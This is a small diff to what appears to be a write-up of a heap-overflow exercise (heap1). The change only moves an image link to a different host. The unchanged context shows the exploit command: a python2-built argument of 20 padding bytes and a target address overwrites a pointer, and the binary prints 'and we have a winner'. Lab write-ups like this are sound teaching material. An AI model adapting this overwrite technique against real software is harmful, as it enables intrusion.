@@ -297,7 +297,7 @@ and we have a winner @ 1757928812
 └─$ ./heap1 `python2 -c "print 'A'*20 + '\x74\x97\x04\x08'"`  `python2 -c "print '\x94\x84\x04\x08'"`
 and we have a winner @ 1757928839
 ```
-![image.png](https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915173422840.png)
+![image.png](https://gcore.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/20250915173422840.png)
 
 
 
